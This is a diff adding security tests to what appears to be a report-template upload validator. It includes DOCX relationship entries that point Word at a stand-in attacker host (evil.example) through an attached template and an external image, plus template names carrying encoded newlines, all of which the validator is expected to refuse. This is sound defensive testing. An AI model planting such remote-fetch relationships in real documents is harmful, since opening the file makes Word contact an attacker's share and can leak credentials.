@@ -187,6 +187,52 @@ def test_a_word_styles_file_must_be_a_plain_docx(root):
             store.validate(styles, data)
 
 
+_RELS = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
+         'relationships">{}</Relationships>')
+
+
+def test_a_word_styles_file_that_fetches_from_outside_is_refused_and_a_hyperlink_is_not(root):
+    """Review 2026-10-23: an attached template on a share or a linked picture
+    is fetched by Word when the client opens the report; a hyperlink is only
+    followed when clicked (pandoc's reference.docx, which the shipped ones
+    copy, carries one)."""
+    styles = _asset("reference-docx")
+    attached = ('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+                'relationships/attachedTemplate" Target="file://evil.example/share/t.dotx" '
+                'TargetMode="External"/>')
+    picture = ("<Relationship TargetMode='External' Id='rId2' Target='http://evil.example/x.png' "
+               "Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/image'/>")
+    for part, rel in (("word/_rels/settings.xml.rels", attached), ("word/_rels/document.xml.rels", picture)):
+        with pytest.raises(store.AssetUploadError, match="outside itself"):
+            store.validate(styles, docx(extra={part: _RELS.format(rel)}))
+    hyperlink = ('<Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+                 'relationships/hyperlink" Target="http://example.com/" TargetMode="External"/>')
+    internal = ('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+                'relationships/styles" Target="styles.xml"/>')
+    facts, _ = store.validate(styles, docx(extra={"word/_rels/document.xml.rels": _RELS.format(hyperlink + internal)}))
+    assert facts["kind"] == "docx"
+    shipped = _shipped_root()
+    if shipped is not None:     # the shipped Word styles stay uploadable
+        store.validate(styles, (shipped / "pentest" / "reference.docx").read_bytes())
+
+
+@pytest.mark.parametrize("name", ["pentest%0A", "pentest%20", "%20pentest"])
+def test_a_template_name_with_a_newline_or_space_is_not_a_template(client, root, test_project, tmp_path, name):
+    """Review 2026-10-23, R-RPT3: ``^…$`` accepted "pentest\\n", the lookup
+    stripped it, and the upload wrote a folder named with the newline."""
+    url = f"/api/v1/projects/{test_project.id}/client-reports/templates/{name}/assets/logo"
+    r = client.put(url, files={"file": ("logo.png", png(680, 200), "image/png")})
+    assert r.status_code in (404, 422), r.text
+    assert client.delete(url).status_code in (404, 422)
+    assert client.get(f"{url}/preview").status_code in (404, 422)
+    uploads = tmp_path / "uploads" / "template_assets"
+    assert not uploads.exists() or list(uploads.iterdir()) == []
+    assert not quarto_render.is_template_name("pentest\n") and quarto_render.is_template_name("pentest")
+    assert not quarto_render.is_asset_id("logo\n") and quarto_render.is_asset_id("logo")
+    with pytest.raises(store.AssetUploadError):
+        store.save("pentest\n", _asset("logo"), png(680, 200), uploaded_by="x", original_filename="l.png")
+
+
 def test_an_svg_asset_cannot_be_uploaded(root):
     with pytest.raises(store.AssetUploadError, match="cannot be uploaded"):
         store.validate(_asset("icon"), b"<svg/>")
